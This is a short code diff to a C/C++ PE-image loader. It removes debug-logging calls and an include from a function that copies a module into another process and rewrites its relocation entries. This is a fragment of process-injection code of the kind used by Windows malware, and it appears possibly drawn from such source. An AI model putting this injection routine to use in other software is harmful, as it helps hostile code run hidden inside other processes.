@@ -8,7 +8,6 @@
 #include "mem.h"
 #include "str.h"
 #include "debug.h"
-#include "WinAPITypes.h"
 
 //Retrieve of NT-headers.
 #define IMAGE_GET_NT_HEADERS(image) ((void *)((IMAGE_NT_HEADERS32 *)((LPBYTE)(image) + ((IMAGE_DOS_HEADER *)(image))->e_lfanew)))
@@ -895,15 +894,9 @@ void *PeImage::_copyModuleToProcessEx(HANDLE process, void *image, IMAGE_DATA_DI
 							if(relList[i] > 0)
 								{
 									DWORD_PTR *p = (DWORD_PTR *)(buf + (relHdrSrc->VirtualAddress + (0x0FFF & (relList[i]))));
-									{
-										WDEBUG2(WDDT_INFO, "Modify relocation: ptr=0x%x, oldValue=0x%x.",(LPBYTE)p,*p);
-									}
 									*p -= oldDelta;
 									*p += delta;
 									*p += relocDelta;
-									{
-										WDEBUG2(WDDT_INFO, "Modify relocation: ptr=0x%x, newValue=0x%x.",(LPBYTE)p,*p);
-									}
 								}
           }
           
